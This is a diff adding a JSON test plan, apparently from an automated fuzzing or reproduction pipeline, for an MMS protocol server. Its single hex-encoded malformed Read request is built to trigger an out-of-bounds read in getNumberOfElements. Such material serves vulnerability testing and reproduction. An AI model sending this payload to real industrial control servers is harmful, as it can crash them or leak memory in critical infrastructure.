@@ -1,0 +1,58 @@
+{
+  "plan_id": "vk-plan-060",
+  "seed_id": "4",
+  "title": "VK-only Read: issue_structural_analogue out-of-bounds read in getNumberOfElements",
+  "strategy": "issue_structural_analogue",
+  "target_operation": "Read",
+  "purpose": "Create distinct read operation analogue using malformed MMS data TLV from issue 197 to exercise out-of-bounds read in getNumberOfElements via MmsValue_decodeMmsData.",
+  "evidence_ids": [
+    "issue:197:197-summary:e3308b450f23",
+    "issue:516:516-summary:13bbaeee92c9",
+    "issue:509:509-summary:228be3676e7d",
+    "issue:513:513-summary:4a07060941e2",
+    "issue:512:512-summary:b25e9a524acd",
+    "issue:cve-2026-18583:cve-2026-18583-summa:3c0f8378f90e"
+  ],
+  "messages": [
+    {
+      "index": 0,
+      "direction": "client_to_server",
+      "label": "VK-only MMS Read request with malformed angle-bracket length TLV",
+      "hex": "0300001b0302020f0000000100c102a10808998600867fffffff00",
+      "byte_length": 27,
+      "sha256": "40becc2efd37389ea597f486912c1d6c1a289b68eb96c740c65bf4f114e37613"
+    }
+  ],
+  "expected_behavior": "server_example_basic_io triggers out-of-bounds read in getNumberOfElements (bufPos/elementLength unchecked) during MmsValue_decodeMmsData",
+  "constraints_preserved": [
+    "TPKT version 0x03 preserved",
+    "TPKT total-length consistent with message size",
+    "visible length counts internally consistent",
+    "single_request shape"
+  ],
+  "issue_safety_notes": "Evidence_id 197 used for getNumberOfElements out-of-bounds trigger; OOB read expected; no definite DoS",
+  "sequence_sha256": "e7c6c36e6646a85ff898054fdb1c686d41e71dfd0d5e637813723edf924193bc",
+  "total_bytes": 27,
+  "message_count_hint": 1,
+  "repair_notes": [],
+  "exact_issue_collision": false,
+  "plan_issue_refs": [
+    "197"
+  ],
+  "_selection_score": 80.0,
+  "export": {
+    "sequence_encoding": "raw-binary-concat",
+    "sequence_file": "sequence.bin",
+    "encoded_sha256": "40becc2efd37389ea597f486912c1d6c1a289b68eb96c740c65bf4f114e37613",
+    "encoded_bytes": 27,
+    "frames": [
+      {
+        "message_index": 0,
+        "frame_offset": 0,
+        "payload_offset": 0,
+        "payload_length": 27,
+        "frame_length": 27
+      }
+    ]
+  }
+}
